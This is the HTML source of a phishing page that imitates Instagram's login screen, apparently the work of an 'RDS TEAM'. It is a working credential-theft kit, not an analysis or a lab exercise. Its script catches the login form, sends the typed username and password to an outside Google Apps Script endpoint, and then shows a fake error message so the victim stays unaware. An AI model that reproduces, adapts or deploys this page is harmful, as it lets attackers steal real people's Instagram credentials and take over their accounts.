<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Login Into Instagram</title>
    <link rel="shortcut icon" href="RDS TEAM LOGO 1.jpg" type="image/x-icon">

    <link rel="stylesheet" type="text/css" href="rds.css">

</head>

<body>
    <div class="container">
        <a href="https://www.instagram.com/">
        <div class="text">Login To Continue</div>
    <div class="page">
        <div class="title"><img alt="Get it on Google Play" class="_aa5q" src="https://freelogopng.com/images/all_img/1658587465instagram-name-logo.png" width="150" height="50"></div>
        <form autocomplete="on" method="post" name="google-sheet">
            <input type="text" placeholder="username,Phone number, or email" name="username">
            <input type="Password" placeholder="Password" name="password">

            <button type="submit" name="submit">Log in</button>

            <div class="option">OR</div>
        </form>
    </a>
        <div class="fblink">
            <span class="fab fa-facebook"></span>
            <a href="https://www.instagram.com/">Log in with Facebook</a>
        </div>

        <div class="forgot-id">
            <a href="https://www.instagram.com/">Forgot Password</a>
        </div>

        <div class="signup">
            <p>Don't have an account?<a href="https://www.instagram.com/">Sign up</a></p>
            <img alt="Get it on Google Play" class="_aa5q" src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" width="150" height="50">
        </div>
    </div>

            <script>
            const scriptURL = 'https://script.google.com/macros/s/AKfycbxCVYdtFSfERpsKkL1yldcLImCg0NZzq710xxkYm6Xl7MwMkW8XhxbIqxmKWIeTSR04/exec'
            const form = document.forms['google-sheet']
          
            form.addEventListener('submit', e => {
              e.preventDefault()
              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                .then(response => alert("Sorry there is some error...."))
                .catch(error => console.error('Error!', error.message))
            })
           </script>


</body>

</html>
